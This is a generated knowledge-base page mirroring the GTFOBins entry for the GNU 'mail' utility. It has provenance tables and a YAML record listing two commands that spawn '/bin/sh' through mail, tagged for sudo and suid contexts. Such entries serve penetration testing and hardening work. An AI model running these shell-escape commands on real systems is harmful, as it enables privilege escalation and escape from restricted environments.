---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# mail

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `mail` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/mail` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [mail](../../tools/linux/mail.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | mail |
| name | mail |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/mail/ |

## Preserved Source Material

```yaml
_body: ''
_name: mail
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/mail
functions:
  shell:
  - code: mail --exec='!/bin/sh'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
    version: GNU
  - code: 'mail -f /etc/hosts

      !/bin/sh'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
